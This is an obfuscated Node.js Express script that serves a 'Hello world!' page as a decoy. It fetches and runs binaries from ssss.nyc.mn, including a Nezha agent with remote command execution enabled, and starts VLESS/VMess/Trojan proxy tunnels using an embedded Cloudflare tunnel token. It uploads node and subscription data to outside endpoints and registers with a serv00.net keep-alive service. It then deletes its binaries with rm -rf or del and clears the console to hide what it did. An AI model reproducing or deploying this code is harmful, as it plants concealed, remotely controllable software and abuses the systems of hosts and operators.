const _0xb54496=_0x26d0;(function(_0x34b1c1,_0x3f6c08){const _0x4fc75a=_0x26d0,_0x9d9ce7=_0x34b1c1();while(!![]){try{const _0x4eda61=parseInt(_0x4fc75a(0x157))/0x1+parseInt(_0x4fc75a(0x176))/0x2*(parseInt(_0x4fc75a(0x134))/0x3)+-parseInt(_0x4fc75a(0x149))/0x4*(-parseInt(_0x4fc75a(0x16e))/0x5)+parseInt(_0x4fc75a(0x160))/0x6+parseInt(_0x4fc75a(0x1a4))/0x7*(-parseInt(_0x4fc75a(0x1d9))/0x8)+-parseInt(_0x4fc75a(0x161))/0x9+-parseInt(_0x4fc75a(0x116))/0xa;if(_0x4eda61===_0x3f6c08)break;else _0x9d9ce7['push'](_0x9d9ce7['shift']());}catch(_0xb4e1e6){_0x9d9ce7['push'](_0x9d9ce7['shift']());}}}(_0x43ca,0xdd1dd),eou);const express=require('express'),app=express(),axios=require(_0xb54496(0x1b8)),os=require('os'),fs=require('fs'),path=require(_0xb54496(0x14d)),{promisify}=require('util'),exec=promisify(require(_0xb54496(0x1bd))[_0xb54496(0x15b)]),{execSync}=require(_0xb54496(0x1bd)),UPLOAD_URL=process[_0xb54496(0x15e)][_0xb54496(0x173)]||'',PROJECT_URL=process['env'][_0xb54496(0x1b3)]||'',AUTO_ACCESS=process[_0xb54496(0x15e)][_0xb54496(0x1b7)]||![],FILE_PATH=process[_0xb54496(0x15e)][_0xb54496(0x178)]||'./tmp',SUB_PATH=process[_0xb54496(0x15e)][_0xb54496(0x1d3)]||_0xb54496(0x12c),PORT=process[_0xb54496(0x15e)]['SERVER_PORT']||process[_0xb54496(0x15e)][_0xb54496(0x1aa)]||0xbb8,UUID=process[_0xb54496(0x15e)]['UUID']||_0xb54496(0x152),NEZHA_SERVER=process[_0xb54496(0x15e)][_0xb54496(0x11b)]||'',NEZHA_PORT=process['env'][_0xb54496(0x17c)]||'',NEZHA_KEY=process['env'][_0xb54496(0x1af)]||'',ARGO_DOMAIN=process[_0xb54496(0x15e)][_0xb54496(0x19f)]||'choreous.dunkirk.de5.net',ARGO_AUTH=process['env'][_0xb54496(0x1c9)]||_0xb54496(0x18c),ARGO_PORT=process['env'][_0xb54496(0x175)]||0x1f41,CFIP=process[_0xb54496(0x15e)][_0xb54496(0x162)]||_0xb54496(0x1b6),CFPORT=process[_0xb54496(0x15e)][_0xb54496(0x125)]||0x1bb,NAME=process['env'][_0xb54496(0x1ad)]||'';!fs[_0xb54496(0x168)](FILE_PATH)?(fs[_0xb54496(0x1c3)](FILE_PATH),console[_0xb54496(0x1c7)](FILE_PATH+_0xb54496(0x1a0))):console['log'](FILE_PATH+_0xb54496(0x15c));function generateRandomName(){const _0x331e5a=_0xb54496,_0x24589e='abcdefghijklmnopqrstuvwxyz';let _0x58b196='';for(let _0x5d3d8b=0x0;_0x5d3d8b<0x6;_0x5d3d8b++){_0x58b196+=_0x24589e['charAt'](Math[_0x331e5a(0x1d5)](Math['random']()*_0x24589e[_0x331e5a(0x1b4)]));}return _0x58b196;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xb54496(0x1bb)](FILE_PATH,npmName),phpPath=path[_0xb54496(0x1bb)](FILE_PATH,phpName),webPath=path[_0xb54496(0x1bb)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0xb54496(0x1bb)](FILE_PATH,_0xb54496(0x17f)),listPath=path[_0xb54496(0x1bb)](FILE_PATH,_0xb54496(0x154)),bootLogPath=path[_0xb54496(0x1bb)](FILE_PATH,_0xb54496(0x1cd)),configPath=path[_0xb54496(0x1bb)](FILE_PATH,_0xb54496(0x148));function _0x26d0(_0x31fbfb,_0x3a75c5){_0x31fbfb=_0x31fbfb-0x116;const _0x43ca79=_0x43ca();let _0x26d0ca=_0x43ca79[_0x31fbfb];return _0x26d0ca;}function deleteNodes(){const _0x178ed1=_0xb54496;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x151b42;try{_0x151b42=fs['readFileSync'](subPath,_0x178ed1(0x1a5));}catch{return null;}const _0x18ad7c=Buffer[_0x178ed1(0x131)](_0x151b42,_0x178ed1(0x1bc))[_0x178ed1(0x1c0)](_0x178ed1(0x1a5)),_0x506bc4=_0x18ad7c['split']('\x0a')['filter'](_0x2966d5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x178ed1(0x1d4)](_0x2966d5));if(_0x506bc4[_0x178ed1(0x1b4)]===0x0)return;return axios[_0x178ed1(0x151)](UPLOAD_URL+_0x178ed1(0x192),JSON[_0x178ed1(0x191)]({'nodes':_0x506bc4}),{'headers':{'Content-Type':_0x178ed1(0x177)}})[_0x178ed1(0x16b)](_0x235735=>{return null;}),null;}catch(_0xf262f9){return null;}}function cleanupOldFiles(){const _0x44b794=_0xb54496;try{const _0xc788a7=fs[_0x44b794(0x12d)](FILE_PATH);_0xc788a7[_0x44b794(0x181)](_0x3c8574=>{const _0x1bacb2=_0x44b794,_0x398310=path[_0x1bacb2(0x1bb)](FILE_PATH,_0x3c8574);try{const _0x12cd4f=fs[_0x1bacb2(0x1cc)](_0x398310);_0x12cd4f['isFile']()&&fs[_0x1bacb2(0x188)](_0x398310);}catch(_0x4e2d84){}});}catch(_0xc7941a){}}app[_0xb54496(0x1c4)]('/',function(_0x5f4832,_0x56844f){const _0x49acd8=_0xb54496;_0x56844f['send'](_0x49acd8(0x196));});async function generateConfig(){const _0x2b0860=_0xb54496,_0x3ec5c4={'log':{'access':_0x2b0860(0x171),'error':_0x2b0860(0x171),'loglevel':_0x2b0860(0x119)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2b0860(0x137),'settings':{'clients':[{'id':UUID,'flow':_0x2b0860(0x18e)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x2b0860(0x1d7),'dest':0xbba},{'path':_0x2b0860(0x13b),'dest':0xbbb},{'path':_0x2b0860(0x13d),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x2b0860(0x135),'protocol':_0x2b0860(0x137),'settings':{'clients':[{'id':UUID}],'decryption':_0x2b0860(0x119)},'streamSettings':{'network':_0x2b0860(0x150),'security':_0x2b0860(0x119)}},{'port':0xbba,'listen':_0x2b0860(0x135),'protocol':_0x2b0860(0x137),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2b0860(0x119)},'streamSettings':{'network':'ws','security':_0x2b0860(0x119),'wsSettings':{'path':_0x2b0860(0x1d7)}},'sniffing':{'enabled':!![],'destOverride':[_0x2b0860(0x198),_0x2b0860(0x170),_0x2b0860(0x14e)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2b0860(0x135),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2b0860(0x13b)}},'sniffing':{'enabled':!![],'destOverride':[_0x2b0860(0x198),_0x2b0860(0x170),_0x2b0860(0x14e)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x2b0860(0x12a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2b0860(0x119),'wsSettings':{'path':_0x2b0860(0x13d)}},'sniffing':{'enabled':!![],'destOverride':[_0x2b0860(0x198),_0x2b0860(0x170),_0x2b0860(0x14e)],'metadataOnly':![]}}],'dns':{'servers':[_0x2b0860(0x1d0)]},'outbounds':[{'protocol':_0x2b0860(0x1a9),'tag':_0x2b0860(0x13f)},{'protocol':_0x2b0860(0x121),'tag':_0x2b0860(0x145)}]};fs[_0x2b0860(0x128)](path['join'](FILE_PATH,'config.json'),JSON['stringify'](_0x3ec5c4,null,0x2));}function getSystemArchitecture(){const _0x136f69=_0xb54496,_0x4d51f2=os[_0x136f69(0x1a2)]();return _0x4d51f2===_0x136f69(0x18d)||_0x4d51f2===_0x136f69(0x199)||_0x4d51f2===_0x136f69(0x18a)?_0x136f69(0x18d):_0x136f69(0x1ce);}function downloadFile(_0x52dc48,_0x2e2dda,_0x284fd0){const _0x1d8425=_0xb54496,_0x4fc1c9=_0x52dc48;!fs[_0x1d8425(0x168)](FILE_PATH)&&fs[_0x1d8425(0x1c3)](FILE_PATH,{'recursive':!![]});const _0x33c200=fs['createWriteStream'](_0x4fc1c9);axios({'method':_0x1d8425(0x1c4),'url':_0x2e2dda,'responseType':_0x1d8425(0x12e)})[_0x1d8425(0x1c1)](_0x14dca7=>{const _0x472ab9=_0x1d8425;_0x14dca7['data'][_0x472ab9(0x19e)](_0x33c200),_0x33c200['on'](_0x472ab9(0x1bf),()=>{const _0x381bec=_0x472ab9;_0x33c200['close'](),console[_0x381bec(0x1c7)](_0x381bec(0x124)+path[_0x381bec(0x1c5)](_0x4fc1c9)+_0x381bec(0x1b1)),_0x284fd0(null,_0x4fc1c9);}),_0x33c200['on'](_0x472ab9(0x120),_0x1adf35=>{const _0x3bf64f=_0x472ab9;fs[_0x3bf64f(0x163)](_0x4fc1c9,()=>{});const _0x32d428=_0x3bf64f(0x124)+path['basename'](_0x4fc1c9)+_0x3bf64f(0x167)+_0x1adf35['message'];console[_0x3bf64f(0x120)](_0x32d428),_0x284fd0(_0x32d428);});})[_0x1d8425(0x16b)](_0x6596c=>{const _0x2f73de=_0x1d8425,_0x33617e=_0x2f73de(0x124)+path['basename'](_0x4fc1c9)+_0x2f73de(0x167)+_0x6596c[_0x2f73de(0x142)];console[_0x2f73de(0x120)](_0x33617e),_0x284fd0(_0x33617e);});}async function downloadFilesAndRun(){const _0x14fdbb=_0xb54496,_0x28a572=getSystemArchitecture(),_0x2f06e5=getFilesForArchitecture(_0x28a572);if(_0x2f06e5[_0x14fdbb(0x1b4)]===0x0){console[_0x14fdbb(0x1c7)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x48c8d8=_0x2f06e5[_0x14fdbb(0x19a)](_0x418201=>{return new Promise((_0x45ef5e,_0x5a71f6)=>{const _0x29117a=_0x26d0;downloadFile(_0x418201[_0x29117a(0x1c8)],_0x418201[_0x29117a(0x144)],(_0x453872,_0x245934)=>{_0x453872?_0x5a71f6(_0x453872):_0x45ef5e(_0x245934);});});});try{await Promise['all'](_0x48c8d8);}catch(_0x178db1){console[_0x14fdbb(0x120)]('Error\x20downloading\x20files:',_0x178db1);return;}function _0x2ecdd9(_0x25d011){const _0x574eec=0x1fd;_0x25d011['forEach'](_0x1737b3=>{const _0xe251fe=_0x26d0;fs[_0xe251fe(0x168)](_0x1737b3)&&fs['chmod'](_0x1737b3,_0x574eec,_0x43dfd5=>{const _0x4d4dac=_0xe251fe;_0x43dfd5?console[_0x4d4dac(0x120)](_0x4d4dac(0x185)+_0x1737b3+':\x20'+_0x43dfd5):console[_0x4d4dac(0x1c7)]('Empowerment\x20success\x20for\x20'+_0x1737b3+':\x20'+_0x574eec[_0x4d4dac(0x1c0)](0x8));});});}const _0x316c62=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2ecdd9(_0x316c62);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x289a92=NEZHA_SERVER[_0x14fdbb(0x14f)](':')?NEZHA_SERVER[_0x14fdbb(0x15d)](':')[_0x14fdbb(0x1ca)]():'',_0x5eb831=new Set([_0x14fdbb(0x1cb),_0x14fdbb(0x159),_0x14fdbb(0x1cf),_0x14fdbb(0x155),_0x14fdbb(0x17d),_0x14fdbb(0x1a6)]),_0x232362=_0x5eb831[_0x14fdbb(0x16f)](_0x289a92)?_0x14fdbb(0x127):_0x14fdbb(0x169),_0x394895='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x14fdbb(0x182)+_0x232362+_0x14fdbb(0x187)+UUID;fs['writeFileSync'](path[_0x14fdbb(0x1bb)](FILE_PATH,_0x14fdbb(0x1b0)),_0x394895);const _0x34259f='nohup\x20'+phpPath+_0x14fdbb(0x141)+FILE_PATH+_0x14fdbb(0x184);try{await exec(_0x34259f),console[_0x14fdbb(0x1c7)](phpName+'\x20is\x20running'),await new Promise(_0x3b31e2=>setTimeout(_0x3b31e2,0x3e8));}catch(_0x264eac){console[_0x14fdbb(0x120)](_0x14fdbb(0x189)+_0x264eac);}}else{let _0x37cdb0='';const _0x4afafc=[_0x14fdbb(0x1cb),_0x14fdbb(0x159),_0x14fdbb(0x1cf),_0x14fdbb(0x155),_0x14fdbb(0x17d),_0x14fdbb(0x1a6)];_0x4afafc[_0x14fdbb(0x14f)](NEZHA_PORT)&&(_0x37cdb0='--tls');const _0x269838=_0x14fdbb(0x12b)+npmPath+_0x14fdbb(0x126)+NEZHA_SERVER+':'+NEZHA_PORT+_0x14fdbb(0x180)+NEZHA_KEY+'\x20'+_0x37cdb0+_0x14fdbb(0x12f);try{await exec(_0x269838),console[_0x14fdbb(0x1c7)](npmName+_0x14fdbb(0x16a)),await new Promise(_0x2986f1=>setTimeout(_0x2986f1,0x3e8));}catch(_0x26a4b7){console[_0x14fdbb(0x120)](_0x14fdbb(0x1ac)+_0x26a4b7);}}}else console['log'](_0x14fdbb(0x1a3));const _0x25696c='nohup\x20'+webPath+_0x14fdbb(0x153)+FILE_PATH+_0x14fdbb(0x174);try{await exec(_0x25696c),console[_0x14fdbb(0x1c7)](webName+'\x20is\x20running'),await new Promise(_0x34a36f=>setTimeout(_0x34a36f,0x3e8));}catch(_0x9d9d73){console[_0x14fdbb(0x120)]('web\x20running\x20error:\x20'+_0x9d9d73);}if(fs['existsSync'](botPath)){let _0x5c43a8;if(ARGO_AUTH[_0x14fdbb(0x18b)](/^[A-Z0-9a-z=]{120,250}$/))_0x5c43a8=_0x14fdbb(0x165)+ARGO_AUTH;else ARGO_AUTH[_0x14fdbb(0x18b)](/TunnelSecret/)?_0x5c43a8=_0x14fdbb(0x186)+FILE_PATH+'/tunnel.yml\x20run':_0x5c43a8='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x14fdbb(0x11a)+ARGO_PORT;try{await exec(_0x14fdbb(0x12b)+botPath+'\x20'+_0x5c43a8+_0x14fdbb(0x11e)),console[_0x14fdbb(0x1c7)](botName+_0x14fdbb(0x16a)),await new Promise(_0x5036c1=>setTimeout(_0x5036c1,0x7d0));}catch(_0x4b76ed){console[_0x14fdbb(0x120)](_0x14fdbb(0x156)+_0x4b76ed);}}await new Promise(_0x2a70f0=>setTimeout(_0x2a70f0,0x1388));}function getFilesForArchitecture(_0x37ef85){const _0x1ddad3=_0xb54496;let _0x24140b;_0x37ef85==='arm'?_0x24140b=[{'fileName':webPath,'fileUrl':_0x1ddad3(0x11c)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x24140b=[{'fileName':webPath,'fileUrl':_0x1ddad3(0x17e)},{'fileName':botPath,'fileUrl':_0x1ddad3(0x1b9)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x59ab2c=_0x37ef85===_0x1ddad3(0x18d)?_0x1ddad3(0x1b5):_0x1ddad3(0x1be);_0x24140b[_0x1ddad3(0x193)]({'fileName':npmPath,'fileUrl':_0x59ab2c});}else{const _0x547483=_0x37ef85===_0x1ddad3(0x18d)?_0x1ddad3(0x147):'https://amd64.ssss.nyc.mn/v1';_0x24140b[_0x1ddad3(0x193)]({'fileName':phpPath,'fileUrl':_0x547483});}}return _0x24140b;}function argoType(){const _0x38b301=_0xb54496;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x38b301(0x1c7)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x38b301(0x14f)](_0x38b301(0x19b))){fs[_0x38b301(0x128)](path[_0x38b301(0x1bb)](FILE_PATH,_0x38b301(0x1d1)),ARGO_AUTH);const _0x24a053=_0x38b301(0x13c)+ARGO_AUTH[_0x38b301(0x15d)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x38b301(0x1bb)](FILE_PATH,_0x38b301(0x1d1))+_0x38b301(0x164)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x38b301(0x1d2);fs[_0x38b301(0x128)](path[_0x38b301(0x1bb)](FILE_PATH,'tunnel.yml'),_0x24a053);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x5af909=_0xb54496;let _0x55b362;if(ARGO_AUTH&&ARGO_DOMAIN)_0x55b362=ARGO_DOMAIN,console[_0x5af909(0x1c7)](_0x5af909(0x194),_0x55b362),await _0x42bae2(_0x55b362);else try{const _0x3dc560=fs[_0x5af909(0x133)](path[_0x5af909(0x1bb)](FILE_PATH,'boot.log'),_0x5af909(0x1a5)),_0x225842=_0x3dc560[_0x5af909(0x15d)]('\x0a'),_0x3bf5a0=[];_0x225842[_0x5af909(0x181)](_0x258065=>{const _0x462ace=_0x5af909,_0x10334a=_0x258065[_0x462ace(0x18b)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x10334a){const _0x5d9725=_0x10334a[0x1];_0x3bf5a0[_0x462ace(0x11d)](_0x5d9725);}});if(_0x3bf5a0[_0x5af909(0x1b4)]>0x0)_0x55b362=_0x3bf5a0[0x0],console[_0x5af909(0x1c7)](_0x5af909(0x1ba),_0x55b362),await _0x42bae2(_0x55b362);else{console[_0x5af909(0x1c7)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x5af909(0x188)](path[_0x5af909(0x1bb)](FILE_PATH,_0x5af909(0x1cd)));async function _0x49a101(){const _0x51ccbf=_0x5af909;try{process[_0x51ccbf(0x1ae)]==='win32'?await exec(_0x51ccbf(0x197)+botName+_0x51ccbf(0x14b)):await exec(_0x51ccbf(0x19c)+botName[_0x51ccbf(0x140)](0x0)+']'+botName[_0x51ccbf(0x1a1)](0x1)+_0x51ccbf(0x15f));}catch(_0x9b9808){}}_0x49a101(),await new Promise(_0x4b1a9e=>setTimeout(_0x4b1a9e,0xbb8));const _0x33c7dc=_0x5af909(0x136)+FILE_PATH+_0x5af909(0x11a)+ARGO_PORT;try{await exec(_0x5af909(0x12b)+botPath+'\x20'+_0x33c7dc+_0x5af909(0x11e)),console[_0x5af909(0x1c7)](botName+_0x5af909(0x16a)),await new Promise(_0xc77725=>setTimeout(_0xc77725,0xbb8)),await extractDomains();}catch(_0x1301e7){console['error'](_0x5af909(0x156)+_0x1301e7);}}}catch(_0x245c62){console[_0x5af909(0x120)]('Error\x20reading\x20boot.log:',_0x245c62);}async function _0x42bae2(_0x1ab45b){const _0x294215=_0x5af909,_0x4e8723=execSync(_0x294215(0x19d),{'encoding':_0x294215(0x1a5)}),_0x5319a8=_0x4e8723[_0x294215(0x11f)](),_0x128647=NAME?NAME+'-'+_0x5319a8:_0x5319a8;return new Promise(_0x148a1f=>{setTimeout(()=>{const _0xf133f1=_0x26d0,_0x4fdd2f={'v':'2','ps':''+_0x128647,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0xf133f1(0x119),'host':_0x1ab45b,'path':_0xf133f1(0x179),'tls':_0xf133f1(0x170),'sni':_0x1ab45b,'alpn':'','fp':_0xf133f1(0x129)},_0x5e56d1=_0xf133f1(0x166)+UUID+'@'+CFIP+':'+CFPORT+_0xf133f1(0x1d6)+_0x1ab45b+_0xf133f1(0x122)+_0x1ab45b+_0xf133f1(0x1d8)+_0x128647+_0xf133f1(0x146)+Buffer[_0xf133f1(0x131)](JSON['stringify'](_0x4fdd2f))[_0xf133f1(0x1c0)](_0xf133f1(0x1bc))+_0xf133f1(0x183)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x1ab45b+_0xf133f1(0x122)+_0x1ab45b+_0xf133f1(0x117)+_0x128647+_0xf133f1(0x1c6);console[_0xf133f1(0x1c7)](Buffer['from'](_0x5e56d1)['toString']('base64')),fs['writeFileSync'](subPath,Buffer[_0xf133f1(0x131)](_0x5e56d1)['toString'](_0xf133f1(0x1bc))),console[_0xf133f1(0x1c7)](FILE_PATH+_0xf133f1(0x143)),uploadNodes(),app[_0xf133f1(0x1c4)]('/'+SUB_PATH,(_0x22607f,_0x77d2c3)=>{const _0x3b2808=_0xf133f1,_0x5d831f=Buffer[_0x3b2808(0x131)](_0x5e56d1)[_0x3b2808(0x1c0)](_0x3b2808(0x1bc));_0x77d2c3[_0x3b2808(0x132)](_0x3b2808(0x16d),_0x3b2808(0x138)),_0x77d2c3[_0x3b2808(0x123)](_0x5d831f);}),_0x148a1f(_0x5e56d1);},0x7d0);});}}async function uploadNodes(){const _0x538753=_0xb54496;if(UPLOAD_URL&&PROJECT_URL){const _0x31952a=PROJECT_URL+'/'+SUB_PATH,_0x315836={'subscription':[_0x31952a]};try{const _0x470dce=await axios[_0x538753(0x151)](UPLOAD_URL+_0x538753(0x14c),_0x315836,{'headers':{'Content-Type':_0x538753(0x177)}});return _0x470dce&&_0x470dce[_0x538753(0x172)]===0xc8?(console[_0x538753(0x1c7)](_0x538753(0x1b2)),_0x470dce):null;}catch(_0x2cfef4){if(_0x2cfef4[_0x538753(0x1ab)]){if(_0x2cfef4[_0x538753(0x1ab)][_0x538753(0x172)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x538753(0x168)](listPath))return;const _0x2dc1bd=fs['readFileSync'](listPath,_0x538753(0x1a5)),_0x15766c=_0x2dc1bd[_0x538753(0x15d)]('\x0a')[_0x538753(0x13a)](_0x1a6a9e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x538753(0x1d4)](_0x1a6a9e));if(_0x15766c['length']===0x0)return;const _0x308a5c=JSON[_0x538753(0x191)]({'nodes':_0x15766c});try{const _0x41107c=await axios[_0x538753(0x151)](UPLOAD_URL+_0x538753(0x15a),_0x308a5c,{'headers':{'Content-Type':_0x538753(0x177)}});return _0x41107c&&_0x41107c[_0x538753(0x172)]===0xc8?(console[_0x538753(0x1c7)](_0x538753(0x17a)),_0x41107c):null;}catch(_0x2677d6){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x58da20=_0x26d0,_0x377750=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x377750[_0x58da20(0x11d)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x377750[_0x58da20(0x11d)](phpPath);process[_0x58da20(0x1ae)]===_0x58da20(0x130)?exec(_0x58da20(0x139)+_0x377750[_0x58da20(0x1bb)]('\x20')+_0x58da20(0x190),_0x3b01bd=>{const _0x2726c8=_0x58da20;console['clear'](),console['log'](_0x2726c8(0x1a7)),console['log'](_0x2726c8(0x195));}):exec(_0x58da20(0x118)+_0x377750[_0x58da20(0x1bb)]('\x20')+_0x58da20(0x13e),_0x424455=>{const _0x44021e=_0x58da20;console[_0x44021e(0x16c)](),console[_0x44021e(0x1c7)](_0x44021e(0x1a7)),console[_0x44021e(0x1c7)](_0x44021e(0x195));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x299347=_0xb54496;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x299347(0x1c7)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x311773=await axios[_0x299347(0x151)](_0x299347(0x14a),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x299347(0x1c7)]('automatic\x20access\x20task\x20added\x20successfully'),_0x311773;}catch(_0x2c849f){return console[_0x299347(0x120)](_0x299347(0x18f)+_0x2c849f[_0x299347(0x142)]),null;}}function _0x43ca(){const _0x3d9cc7=['2083','https://amd64.ssss.nyc.mn/web','sub.txt','\x20-p\x20','forEach','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0a\x20\x20\x0atrojan://','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Empowerment\x20failed\x20for\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','unlinkSync','php\x20running\x20error:\x20','aarch64','match','eyJhIjoiODMzODQxZDFjYzE3MzEyYjZmZDkwNjBiZjdjNDY5MmMiLCJ0IjoiODQwODk0ZjctYzBkNS00Yjk3LTk5NmYtMzU2ZGY5N2NiMGE5IiwicyI6Ik5XUTNaVFZrWVRFdFpHRmtNeTAwTVdObExUZ3hNMkl0TkRWaVlUY3paV1F4Tm1WaiJ9','arm','xtls-rprx-vision','Add\x20automatic\x20access\x20task\x20faild:\x20','\x20>\x20nul\x202>&1','stringify','/api/delete-nodes','unshift','ARGO_DOMAIN:','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Hello\x20world!','taskkill\x20/f\x20/im\x20','http','arm64','map','TunnelSecret','pkill\x20-f\x20\x22[','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','pipe','ARGO_DOMAIN','\x20is\x20created','substring','arch','NEZHA\x20variable\x20is\x20empty,skip\x20running','5082637YvVbOI','utf-8','2053','App\x20is\x20running','listen','freedom','PORT','response','npm\x20running\x20error:\x20','NAME','platform','NEZHA_KEY','config.yaml','\x20successfully','Subscription\x20uploaded\x20successfully','PROJECT_URL','length','https://arm64.ssss.nyc.mn/agent','saas.sin.fan','AUTO_ACCESS','axios','https://amd64.ssss.nyc.mn/bot','ArgoDomain:','join','base64','child_process','https://amd64.ssss.nyc.mn/agent','finish','toString','then','Unhandled\x20error\x20in\x20startserver:','mkdirSync','get','basename','\x0a\x20\x20\x20\x20','log','fileName','ARGO_AUTH','pop','443','statSync','boot.log','amd','2096','https+local://8.8.8.8/dns-query','tunnel.json','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','SUB_PATH','test','floor','?encryption=none&security=tls&sni=','/vless-argo','&path=%2Fvless-argo%3Fed%3D2560#','8AuqVTN','178600rjASgq','&path=%2Ftrojan-argo%3Fed%3D2560#','rm\x20-rf\x20','none','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','NEZHA_SERVER','https://arm64.ssss.nyc.mn/web','push','\x20>/dev/null\x202>&1\x20&','trim','error','blackhole','&fp=firefox&type=ws&host=','send','Download\x20','CFPORT','\x20-s\x20','true','writeFileSync','firefox','trojan','nohup\x20','subabc','readdirSync','stream','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','win32','from','set','readFileSync','6TtuqEy','127.0.0.1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','vless','text/plain;\x20charset=utf-8','del\x20/f\x20/q\x20','filter','/vmess-argo','\x0a\x20\x20tunnel:\x20','/trojan-argo','\x20>/dev/null\x202>&1','direct','charAt','\x20-c\x20\x22','message','/sub.txt\x20saved\x20successfully','fileUrl','block','\x0a\x20\x20\x0avmess://','https://arm64.ssss.nyc.mn/v1','config.json','539016ccHriA','https://oooo.serv00.net/add-url','.exe\x20>\x20nul\x202>&1','/api/add-subscriptions','path','quic','includes','tcp','post','bc97f674-c578-4940-9234-0a1da46041b9','\x20-c\x20','list.txt','2087','Error\x20executing\x20command:\x20','1076109mqOwPw','Error\x20in\x20startserver:','8443','/api/add-nodes','exec','\x20already\x20exists','split','env','\x22\x20>\x20/dev/null\x202>&1','2668362arCHGA','15687126PpyXAU','CFIP','unlink','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0avless://','\x20failed:\x20','existsSync','false','\x20is\x20running','catch','clear','Content-Type','5hcXNHW','has','tls','/dev/null','status','UPLOAD_URL','/config.json\x20>/dev/null\x202>&1\x20&','ARGO_PORT','1737068vUEtNX','application/json','FILE_PATH','/vmess-argo?ed=2560','Nodes\x20uploaded\x20successfully','http\x20server\x20is\x20running\x20on\x20port:','NEZHA_PORT'];_0x43ca=function(){return _0x3d9cc7;};return _0x43ca();}async function startserver(){const _0x3c47f4=_0xb54496;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0xf43aa9){console[_0x3c47f4(0x120)](_0x3c47f4(0x158),_0xf43aa9);}}startserver()[_0xb54496(0x16b)](_0xaa79ba=>{const _0x339b97=_0xb54496;console[_0x339b97(0x120)](_0x339b97(0x1c2),_0xaa79ba);}),app[_0xb54496(0x1a8)](PORT,()=>console['log'](_0xb54496(0x17b)+PORT+'!'));
